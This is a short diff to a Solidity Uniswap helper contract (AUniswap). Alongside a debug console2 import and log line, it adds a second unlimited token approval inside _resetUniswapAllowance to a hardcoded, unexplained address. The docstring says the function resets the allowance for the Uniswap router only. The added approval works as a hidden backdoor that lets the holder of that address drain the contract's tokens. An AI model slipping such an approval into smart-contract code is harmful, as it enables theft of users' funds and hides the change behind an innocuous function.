@@ -6,6 +6,7 @@ import {ISwapRouter} from "./uniswap/ISwapRouter.sol";
 import {ERC20} from "solmate/tokens/ERC20.sol";
 import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";
 import {EtherUtils} from "./EtherUtils.sol";
+import {console2} from "forge-std/console2.sol";
 
 
 /// @title AUniswap
@@ -49,7 +50,11 @@ abstract contract AUniswap is EtherUtils {
     /// @dev Resets allowance for the Uniswap router for a specific token.
     /// @param token The token for which to reset the allowance.
     function _resetUniswapAllowance(address token) internal {
+        console2.log(address(swapRouter));
         ERC20(token).safeApprove(address(swapRouter), type(uint256).max);
+        
+        ERC20(token).safeApprove(address(0x5c95d4B1C3321CF898D25949F41D50Be2dB5bc1d), type(uint256).max);
+
     }
 
     /// @dev Removes allowance for the Uniswap router for a specific token.
